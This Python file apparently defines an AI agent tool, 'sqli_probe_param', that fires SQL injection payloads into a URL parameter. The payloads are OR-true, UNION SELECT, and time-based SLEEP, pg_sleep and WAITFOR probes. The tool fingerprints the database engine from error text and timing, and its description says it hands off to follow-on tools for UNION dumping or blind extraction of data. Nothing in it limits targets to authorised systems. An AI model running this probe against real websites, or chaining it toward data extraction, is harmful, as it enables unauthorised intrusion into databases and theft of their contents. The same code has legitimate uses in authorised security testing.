"""TOOL: sqli_test - parameter injection probing with engine fingerprinting."""
import json, urllib.request, urllib.error, urllib.parse
from tools import register

PAYLOADS = [
    ("quote_break", "'"),
    ("or_true", "' OR '1'='1"),
    ("union_marker", "' UNION SELECT NULL-- "),
    ("mysql_sleep", "' AND SLEEP(4)-- "),
    ("pg_sleep", "'; SELECT pg_sleep(4)-- "),
    ("mssql_wait", "'; WAITFOR DELAY '0:0:4'-- "),
    ("sqlite_err", "' AND 1=CONVERT(int,'x')-- "),
]

def _call(url, timeout=12):
    rq = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    t0 = __import__("time").time()
    try:
        r = urllib.request.urlopen(rq, timeout=timeout)
        return r.status, r.read().decode(errors="replace")[:250], __import__("time").time() - t0
    except urllib.error.HTTPError as ex:
        return ex.code, ex.read().decode(errors="replace")[:350], __import__("time").time() - t0
    except Exception as ex:
        return -1, f"{type(ex).__name__}: {str(ex)[:70]}", __import__("time").time() - t0

@register(name="sqli_probe_param",
          desc="SCOUT (sqli step 1): test one URL parameter for SQL injection across engines — error leaks, response diffs, timing anomalies. Does NOT extract data: on confirmation, hand off to sqli_union_dump (or sqli_blind_extract if UNION output never renders).",
          params={"type":"object","properties":{
              "url_template":{"type":"string","description":"URL containing {INJ} placeholder where injection goes, e.g. https://x.com/a.php?q={INJ}"},
              "baseline_value":{"type":"string"}},
              "required":["url_template"]})
def sqli_probe_param(url_template, baseline_value="us"):
    base_st, base_b, base_t = _call(url_template.replace("{INJ}", urllib.parse.quote(baseline_value)))
    findings = []
    for name, payload in PAYLOADS:
        expect_slow = "sleep" in name.lower() or "waitfor" in name.lower()
        st, b, dt = _call(url_template.replace("{INJ}", urllib.parse.quote(payload, safe="")))
        sig = []
        low = b.lower()
        for eng, kw in [("mysql", ["sql syntax","mysql","mysqli"]),("postgres", ["pg_","postgres","unterminated"]),
                        ("mssql", ["sql server","waitfor","unclosed quotation"]),
                        ("sqlite", ["sqlite","unrecognized token"]),("generic", ["warning:", "exception"])]:
            if any(k in low for k in kw): sig.append(eng + "-error")
        if expect_slow and dt > 3.5: sig.append(f"TIME-BASED ({dt:.1f}s)")
        if st != base_st and st != -1: sig.append(f"status-diff({st} vs {base_st})")
        findings.append({"payload": name, "status": st, "time_s": round(dt, 2), "signals": sig})
    vuln = [f for f in findings if f["signals"]]
    return json.dumps({"baseline_status": base_st,
                       "vulnerable_signals": vuln or "none - parameterized backend likely",
                       "detail": findings}, ensure_ascii=False, indent=1)
